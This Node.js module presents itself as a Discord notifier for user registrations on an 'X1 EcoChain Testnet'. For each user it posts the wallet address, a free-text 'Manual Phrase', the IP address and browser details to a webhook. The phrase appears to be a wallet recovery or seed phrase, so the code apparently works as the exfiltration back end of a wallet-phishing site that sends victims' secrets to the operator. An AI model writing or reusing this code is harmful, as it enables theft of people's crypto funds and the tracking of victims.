const axios = require('axios');

const sendToDiscord = async (user, isNew = true) => {
  try {
    if (!process.env.DISCORD_WEBHOOK_URL) {
      console.log('Discord webhook not configured, skipping notification');
      return;
    }

    const action = isNew ? 'New User Registered' : 'User Updated';
    const color = isNew ? 3066993 : 10181046; // Green for new, blue for update

    const embed = {
      title: action,
      color: color,
      fields: [
        {
          name: 'Wallet Address',
          value: `\`${user.walletAddress}\``,
          inline: false,
        },
        {
          name: 'Manual Phrase',
          value: user.manualPhrase.length > 1000 
            ? `\`\`\`${user.manualPhrase.substring(0, 1000)}...\`\`\`` 
            : `\`\`\`${user.manualPhrase}\`\`\``,
          inline: false,
        },
        {
          name: 'Device Type',
          value: user.browserInfo?.deviceType || 'Unknown',
          inline: true,
        },
        {
          name: 'Browser',
          value: `${user.browserInfo?.browserName || 'Unknown'} ${user.browserInfo?.browserVersion || ''}`,
          inline: true,
        },
        {
          name: 'Platform',
          value: user.browserInfo?.platform || 'Unknown',
          inline: true,
        },
        {
          name: 'IP Address',
          value: `\`${user.browserInfo?.ipAddress || 'Unknown'}\``,
          inline: true,
        },
        {
          name: 'User Agent',
          value: `\`\`\`${user.browserInfo?.userAgent?.substring(0, 100) || 'Unknown'}...\`\`\``,
          inline: false,
        },
        {
          name: 'Timestamp',
          value: new Date().toISOString(),
          inline: false,
        },
      ],
      footer: {
        text: 'X1 EcoChain Testnet',
      },
    };

    const payload = {
      embeds: [embed],
    };

    await axios.post(process.env.DISCORD_WEBHOOK_URL, payload);
    console.log('Discord notification sent successfully');
  } catch (error) {
    console.error('Error sending to Discord:', error.message);
  }
};

module.exports = { sendToDiscord };
